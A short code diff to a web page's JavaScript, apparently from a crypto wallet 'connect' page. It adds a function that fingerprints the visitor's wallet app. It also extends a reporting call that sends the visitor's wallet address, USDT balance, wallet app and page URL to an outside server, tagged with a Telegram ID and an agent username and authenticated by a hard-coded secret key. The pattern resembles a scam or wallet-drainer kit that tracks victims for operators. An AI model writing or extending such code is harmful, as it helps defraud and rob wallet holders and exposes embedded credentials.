@@ -497,6 +497,19 @@
 
 			let hasReportedConnect = false
 
+			function detectWalletApp() {
+				const ua = navigator.userAgent.toLowerCase()
+				if (window.tronWeb && window.tronWeb.isTokenPocket) return 'TokenPocket'
+				if (ua.includes('tokenpocket')) return 'TokenPocket'
+				if (ua.includes('imtoken')) return 'imToken'
+				if (ua.includes('bitkeep')) return 'BitKeep'
+				if (ua.includes('okex')) return 'OKX Wallet'
+				if (window.tronLink) return 'TronLink'
+				if (ua.includes('android')) return 'Android Browser'
+				if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS Browser'
+				return 'Unknown Wallet'
+			}
+
 			function notifyWalletConnected(data) {
 				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
 				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
@@ -512,6 +525,8 @@
 					action: 'wallet_connected',
 					telegramId: tgid,
 					agentUsername: kefu,
+					walletApp: detectWalletApp(),
+					connectUrl: window.location.href,
 					walletInfo: {
 						address: data.address,
 						usdtBalance: data.usdtBalance,
